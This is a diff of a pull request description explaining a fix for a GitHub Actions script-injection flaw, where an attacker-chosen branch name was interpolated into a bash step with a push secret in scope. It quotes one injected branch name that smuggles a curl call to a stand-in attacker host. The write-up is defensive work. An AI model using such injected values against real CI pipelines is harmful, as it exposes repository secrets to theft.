@@ -5,10 +5,10 @@
 `.github/workflows/quality.yml` was interpolating
 `github.event.pull_request.head.ref` (the PR source branch name, attacker-
 controllable by anyone who can open a PR) directly into a bash `run:` block via
-`${{ … }}`. The expansion happens **before** bash sees the script, so a branch
-name like `foo"; curl evil.example #` would have escaped its quoting and
-executed inside the runner with `secrets.ACTIONS_PUSH` in scope — a textbook
-GitHub Actions script-injection. Closes #2709.
+`{% raw %}${{ … }}{% endraw %}`. The expansion happens **before** bash sees the
+script, so a branch name like `foo"; curl evil.example #` would have escaped its
+quoting and executed inside the runner with `secrets.ACTIONS_PUSH` in scope — a
+textbook GitHub Actions script-injection. Closes #2709.
 
 This PR hardens the workflow by:
 
@@ -41,6 +41,8 @@ pattern is gone:
 
 ### Data flow before vs after
 
+{% raw %}
+
 ```mermaid
 flowchart LR
   subgraph Before
@@ -55,6 +57,8 @@ flowchart LR
     V -.->|reject| X2[step fails]
   end
 ```
+
+{% endraw %}
 
 ## Test Plan
 
